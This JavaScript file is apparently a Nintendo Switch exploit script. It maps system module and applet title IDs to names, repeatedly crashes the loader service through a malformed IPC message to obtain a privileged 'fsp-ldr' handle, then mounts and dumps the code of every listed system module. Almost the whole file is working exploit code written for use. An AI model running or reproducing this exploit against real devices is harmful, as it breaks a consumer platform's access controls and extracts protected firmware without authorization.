var modules ={
	// Sysmodules
	'usb' : '0100000000000006',
	'tma' : '0100000000000007',
	'boot2': '0100000000000008',
	'settings' : '0100000000000009',
	'bus' : '010000000000000A',
	'bluetooth' : '010000000000000B',
	'bcat' : '010000000000000C',
	'friends': '010000000000000E',
	'nifm': '010000000000000F',
	'ptm': '0100000000000010',
	'bsdsockets': '0100000000000012',
	'hid': '0100000000000013',
	'audio': '0100000000000014',
	'LogManager.Prod' : '0100000000000015',
	'wlan' : '0100000000000016',
	'ldn' : '0100000000000018',
	'nvservices' : '0100000000000019',
	'pcv' : '010000000000001A',
	'ppc' : '010000000000001B',
	'nvnflinger' : '010000000000001C',
	'pcie.withoutHb' : '010000000000001D',
	'account' : '010000000000001E',
	'ns' : '010000000000001F',
	'nfc' : '0100000000000020',
	'psc' : '0100000000000021',
	'capsrv' : '0100000000000022',
	'am' : '0100000000000023',
	'ssl' : '0100000000000024',
	'nim' : '0100000000000025',
	'lbl' : '0100000000000029',
	'btm' : '010000000000002A',
	'erpt' : '010000000000002B',
	'vi' : '010000000000002D',
	'pctl' : '010000000000002E',
	'npns' : '010000000000002F',
	'eupld': '0100000000000030',
	'glue' : '0100000000000031',
	'eclct' : '0100000000000032',
	'es' : '0100000000000033',
	'fatal' : '0100000000000034',
	'creport' : '0100000000000036',

	// Applets
	'qlaunch': '0100000000001000',
	'auth': '0100000000001001',
	'cabinet': '0100000000001002',
	'controller': '0100000000001003',
	'dataErase': '0100000000001004',
	'error': '0100000000001005',
	'netConnect': '0100000000001006',
	'playerSelect': '0100000000001007',
	'swkbd': '0100000000001008',
	'miiEdit': '0100000000001009',
	'LibAppletWeb': '010000000000100A',
	'LibAppletShop': '010000000000100B',
	'overlayDisp': '010000000000100C',
	'photoViewer': '010000000000100D',
	'LibAppletOff': '010000000000100F',
	'LibAppletLns': '0100000000001010',
	'LibAppletAuth': '0100000000001011',
	'starter': '0100000000001012',
	'myPage': '0100000000001013',
	'maintenance': '0100000000001015',

	// System Apps
	'flog': '01008BB00013C000'
};
function dumpModule(module, loader, name) {
	//We need a ILocationResolver to pass to fsp to say what we are reading so we're getting a handle
	sc.getService("lr", (lripc) => {
		//3 is the StorageID for NAND System
		var lr = sc.ipcMsg(0).data(3).sendTo(lripc).assertOk();
		sc.withHandle(lr.movedHandles[0], (content) => {
			//We are getting our ContentPath needed for fsp, c being the "receiving" buffer
			var buf = new ArrayBuffer(0x300);
			sc.ipcMsg(0).data(utils.parseAddr(module)).cDescriptor(buf).sendTo(content).assertOk();

			//We are now mounting our code region
			var fs =sc.ipcMsg(0).datau64(utils.parseAddr(module)).xDescriptor(buf).sendTo(loader).assertOk();
			sc.withHandle(fs.movedHandles[0], (storage) => {
				//utils.log('Got IFileSystem handle: 0x'+ storage.toString(16));
				var fs = new sc.IFileSystem(sc, storage);
				var dir = fs.OpenDir('/').getValue();
				//DUMP ALL THE THINGS
				dir.DirDump(name);
			});
		});
	});
}


utils.log("stage1, crashing ldr");
var i = 0;
var srv = null;
while (true) {
	sc.ipcMsg(2).setType(5).sendTo('ldr:dmnt');
	srv = sc.getService('fsp-ldr');
	if (srv.isOk) {
		utils.log('Boom.');
		break;
	}
	i++;
}

srv = srv.assertOk();
utils.log('Got fsp-ldr handle after '+i+' iterations: ');
utils.log('fsp-ldr handle: '+ srv);

utils.log("stage2, dumping sysmodule");
for (var name in modules) {
	utils.log("dumping " + name);
	try {
		dumpModule(modules[name], srv, name);
	}
	catch (e) {
	}
};
